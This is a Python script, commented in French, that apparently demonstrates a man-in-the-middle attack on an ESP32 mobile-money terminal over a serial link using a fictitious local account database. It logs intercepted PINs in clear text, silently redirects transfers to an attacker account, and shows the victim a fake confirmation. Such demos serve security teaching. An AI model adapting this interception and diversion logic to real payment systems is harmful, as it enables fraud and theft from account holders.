import serial
import serial.tools.list_ports
import sys
import time
import json
import os
from datetime import datetime

# Configuration du simulateur d'attaque
NOM_FICHIER_LOG = "historique_transactions.log"
FICHIER_JSON = "abonnes.json"
FICHIER_BUTIN_PIN = "pin_pirates.txt"

# Compte de l'attaquant qui va recevoir l'argent volé
NUMERO_COMPTE_ATTAQUANT = "243999999999" # Numéro fictif de l'attaquant

def lister_ports_serie():
    ports = serial.tools.list_ports.comports()
    return ports

def selectionner_port():
    print("[!] MODE ATTACK : Recherche des ports série pour interception...")
    ports = lister_ports_serie()
    if not ports:
        print("[-] Aucun port détecté.")
        sys.exit(1)
    for i, port in enumerate(ports):
        print(f"[{i}] {port.device} - {port.description}")
    while True:
        try:
            choix = input("\nSélectionnez le port de l'ESP32 cible : ")
            idx = int(choix)
            if 0 <= idx < len(ports):
                return ports[idx].device
        except ValueError:
            print("Entrée invalide.")

def charger_abonnes():
    if not os.path.exists(FICHIER_JSON):
        return []
    with open(FICHIER_JSON, 'r', encoding='utf-8') as f:
        return json.load(f)

def sauvegarder_abonnes(abonnes):
    with open(FICHIER_JSON, 'w', encoding='utf-8') as f:
        json.dump(abonnes, f, ensure_ascii=False, indent=4)

def intercepter_et_traiter(requete_str):
    """
    Simule l'attaque MitM :
    1. Aspire le code PIN en clair et le stocke.
    2. Modifie le numéro de destinataire à la volée s'il s'agit d'un transfert.
    """
    abonnes = charger_abonnes()
    if not abonnes:
        return "REPONSE;ERREUR;Base de donnees inaccessible"

    # L'utilisateur légitime (Abonné ID 2, index 1)
    expediteur = abonnes[1] if len(abonnes) > 1 else abonnes[0]
    solde_expediteur = expediteur.get("solde", 0.0)
    nom_exp = f"{expediteur.get('prenom', '')} {expediteur.get('nom', '')}"
    numero_exp = expediteur.get("numero_compte", "Inconnu")
    pin_attendu = expediteur.get("code_pin", "")

    try:
        parts = requete_str.split(';')
        type_requete = parts[0]

        # --- ATTAQUE SUR LA CONSULTATION (Aspiration de PIN) ---
        if type_requete == "REQ_SOLDE":
            pin_recu = ""
            for part in parts:
                if part.startswith("PIN:"):
                    pin_recu = part.split(":")[1]

            # Vol du PIN
            print(f"\n[💀 MITM ALERT] PIN intercepté en clair : {pin_recu} (Propriétaire: {nom_exp})")
            with open(FICHIER_BUTIN_PIN, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] Cible: {nom_exp} | Compte: {numero_exp} | PIN Volé: {pin_recu}\n")

            if pin_recu != pin_attendu:
                return "REP_SOLDE;ERREUR;Code PIN incorrect"

            reponse_ecran = f"{nom_exp}|Num: {numero_exp}|Solde: {solde_expediteur:.2f} USD"
            return f"REP_SOLDE;OK;{reponse_ecran}"

        # --- ATTAQUE SUR LE TRANSFERT (Détournement de fonds) ---
        elif type_requete == "REQ_TRANS":
            opt, num_dest, mont, pin_recu = "", "", "0", ""
            for part in parts:
                if part.startswith("OPT:"): opt = part.split(":")[1]
                elif part.startswith("NUM:"): num_dest = part.split(":")[1]
                elif part.startswith("MONT:"): mont = part.split(":")[1]
                elif part.startswith("PIN:"): pin_recu = part.split(":")[1]

            # Vol du PIN lors de la transaction
            print(f"\n[💀 MITM ALERT] PIN intercepté lors du transfert : {pin_recu}")
            with open(FICHIER_BUTIN_PIN, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] Cible: {nom_exp} | PIN Volé: {pin_recu}\n")

            if pin_recu != pin_attendu:
                return "REP_TRANS;ERREUR;Code PIN incorrect"

            try:
                montant_float = float(mont.replace("USD", "").replace("FC", "").strip())
                montant_float = round(montant_float, 2)
            except ValueError:
                montant_float = 0.0

            if montant_float <= 0 or solde_expediteur < montant_float:
                return "REP_TRANS;ERREUR;Solde insuffisant ou montant invalide"

            # [🔥 ATTAQUE !!!] Le pirate remplace secrètement le destinataire demandé par le sien
            original_dest = num_dest
            num_dest = NUMERO_COMPTE_ATTAQUANT # Détournement !
            
            print(f"[🔥 MITM ATTACK] Détournement du transfert de {montant_float} USD !")
            print(f"      Destinataire légitime : {original_dest}")
            print(f"      -> Nouveau destinataire (PIRATE) : {num_dest}")

            # Recherche du compte pirate pour lui créditer l'argent
            destinataire = None
            for ab in abonnes:
                if ab.get("numero_compte") == num_dest:
                    destinataire = ab
                    break

            if destinataire is None:
                # Si le compte pirate n'existe pas dans le JSON, on le crée fictivement pour la démo
                destinataire = {"nom": "PIRATE", "post_nom": "Hacker", "prenom": "Evil", "numero_compte": NUMERO_COMPTE_ATTAQUANT, "solde": 0.0, "code_pin": "6666"}
                abonnes.append(destinataire)

            nom_dest_complet = f"{destinataire.get('nom', '')} {destinataire.get('post_nom', '')}".strip()

            # Application de la double écriture frauduleuse
            solde_dest_ancien = destinataire.get("solde", 0.0)
            expediteur["solde"] = round(solde_expediteur - montant_float, 2)
            destinataire["solde"] = round(solde_dest_ancien + montant_float, 2)
            
            sauvegarder_abonnes(abonnes)

            # Écriture dans les logs système (Le pirate tente de maquiller le log mais garde une trace)
            horodatage = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
            log_msg = (
                f"\n{horodatage} !!! FRAUDE DETECTEE / INTERCEPTION MITM !!!\n"
                f"EXPEDITEUR : {nom_exp} ({numero_exp})\n"
                f"DESTINATAIRE VICTIME DU DETOURNEMENT : {original_dest}\n"
                f"DESTINATAIRE REEL (PIRATE) : {nom_dest_complet} ({num_dest})\n"
                f"MONTANT DETOURNE : {montant_float:.2f} USD\n"
                f"==========================================================\n"
            )
            with open(NOM_FICHIER_LOG, "a", encoding="utf-8") as f:
                f.write(log_msg)

            # [🎭 CAMOUFLAGE] Pour que la victime ne se doute de rien, on lui affiche à l'écran
            # que l'argent a bien été envoyé au destinataire légitime qu'elle avait saisi !
            success_msg = f"Transfert effectue!|Vers: {original_dest}|Montant: {montant_float:.2f} USD|Nouveau Solde: {expediteur['solde']:.2f} USD"
            return f"REP_TRANS;OK;{success_msg}"

        else:
            return "REPONSE;ERREUR;Requete inconnue"
    except Exception as e:
        return "REPONSE;ERREUR;Erreur interne"

def demarrer_interception(port_com):
    print(f"\n[+] Branchement de la sonde d'interception sur {port_com}...")
    try:
        ser = serial.Serial(port=port_com, baudrate=115200, timeout=1)
        ser.flushInput()
        ser.flushOutput()
        print("[☠️] SYSTEME DE DETOURNEMENT ACTIF ! En attente de transactions...\n")
    except Exception as e:
        print(f"[-] Erreur : {e}")
        sys.exit(1)

    try:
        while True:
            if ser.in_waiting > 0:
                ligne_brute = ser.readline()
                try:
                    ligne = ligne_brute.decode('utf-8').rstrip()
                except UnicodeDecodeError:
                    ligne = ligne_brute.decode('latin-1', errors='ignore').rstrip()

                if ligne.startswith("REQ_"):
                    # On affiche la requête capturée avant modification
                    print(f"\n[⚡ Intercepté] -> {ligne}")
                    
                    # On applique l'attaque
                    reponse_frauduleuse = intercepter_et_traiter(ligne)
                    
                    # On renvoie la réponse maquillée à l'ESP32
                    ser.write((reponse_frauduleuse + "\n").encode('utf-8'))
                    ser.flush()
            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\n[+] Arrêt de la sonde d'interception.")
    finally:
        ser.close()

if __name__ == "__main__":
    print("==========================================================")
    print("      SIMULATEUR D'ATTAQUE DE L'HOMME DU MILIEU (MitM)    ")
    print("==========================================================")
    port = selectionner_port()
    demarrer_interception(port)
